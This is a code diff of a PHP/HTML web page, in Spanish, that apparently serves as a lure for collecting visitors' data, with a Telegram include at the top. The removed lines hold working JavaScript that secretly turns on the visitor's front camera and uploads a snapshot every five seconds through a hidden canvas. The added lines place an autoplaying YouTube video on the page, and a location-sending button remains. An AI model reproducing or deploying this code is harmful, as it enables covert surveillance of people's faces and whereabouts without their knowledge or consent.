@@ -6,58 +6,25 @@ require_once __DIR__ . '/telegram.php';
 <!doctype html>
 <html>
 <head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
 <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
 
-<div class="video-wrap">
-   <video id="video" playsinline autoplay></video>
-</div>
+<!-- Video de YouTube incrustado -->
+<iframe id="Live_YT_TV" width="100%" height="500px" 
+    src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" 
+    frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" 
+    allowfullscreen>
+</iframe>
 
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
+<!-- Botón para enviar ubicación -->
 <button id="btnLocate">Enviar ubicación</button>
 <div id="locStatus"></div>
 <pre id="locData"></pre>
 
 <script>
 'use strict';
-
-// ==== CÁMARA ====
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-
-const constraints = { audio: false, video: { facingMode: "user" } };
-
-async function initCamera() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = stream;
-    } catch(e) {
-        console.error("Error al acceder a la cámara:", e);
-    }
-}
-
-function takePhoto() {
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, 640, 480);
-    const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
-
-    $.ajax({
-        type: 'POST',
-        url: 'photo.php',
-        data: { cat: imgData },
-        dataType: 'json',
-        success: res => console.log('Foto enviada', res),
-        error: err => console.error('Error enviando foto', err)
-    });
-}
-
-// Foto cada 5 segundos
-setInterval(takePhoto, 5000);
-initCamera();
 
 // ==== GEOLOCALIZACIÓN ====
 const btn = document.getElementById('btnLocate');
